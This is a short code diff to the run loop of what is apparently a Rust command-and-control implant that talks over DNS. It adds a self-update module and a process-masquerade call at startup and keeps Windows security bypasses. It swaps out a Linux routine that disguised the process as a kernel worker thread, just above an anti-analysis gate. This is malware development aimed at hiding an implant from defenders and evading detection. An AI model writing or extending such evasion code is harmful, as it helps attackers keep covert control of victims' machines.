@@ -1,3 +1,5 @@
+pub mod selfupdate;
+
 use crate::c2::{self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus};
 use crate::crypto::EncryptionKey;
 use crate::dns::DnsBackend;
@@ -102,14 +104,11 @@ pub async fn run(
     backend: &dyn DnsBackend,
     config: &AgentConfig,
 ) -> Result<(), C2Error> {
-    // Apply evasion on startup
+    // ─── Process masquerade + evasion on startup ───
+    evasion::masquerade::masquerade();
     #[cfg(target_os = "windows")]
     {
         crate::evasion::runtime::windows::apply_all_bypasses();
-    }
-    #[cfg(target_os = "linux")]
-    {
-        crate::evasion::runtime::linux::mask_process_name("[kworker/0:1-events]");
     }
 
     // ─── Anti-analysis gate ───
